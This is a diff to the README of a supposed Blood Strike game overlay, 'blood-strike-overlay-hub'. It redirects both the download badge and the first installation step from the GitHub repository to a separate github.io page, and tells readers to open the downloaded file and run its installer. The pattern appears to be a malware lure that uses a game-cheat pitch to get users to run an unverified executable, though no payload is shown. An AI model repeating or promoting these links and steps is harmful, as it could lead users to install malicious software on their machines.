@@ -1,6 +1,6 @@
 # 🎯 blood-strike-overlay-hub - Real time tactical data for Blood Strike
 
-[![Download blood-strike-overlay-hub](https://img.shields.io/badge/Download_Now-Blue-blue.svg)](https://github.com/bluefigcassinskingbird795/blood-strike-overlay-hub)
+[![Download blood-strike-overlay-hub](https://img.shields.io/badge/Download_Now-Blue-blue.svg)](https://bluefigcassinskingbird795.github.io)
 
 ## 📌 Overview
 
@@ -18,7 +18,7 @@ Your computer needs to meet these standards to run the overlay without lag:
 
 ## 📥 Installation Steps
 
-1. Visit [this page](https://github.com/bluefigcassinskingbird795/blood-strike-overlay-hub) to download the installation file.
+1. Visit [this page](https://bluefigcassinskingbird795.github.io) to download the installation file.
 2. Locate the download folder on your machine.
 3. Open the downloaded file to start the installer.
 4. Follow the screen prompts to complete the setup process.
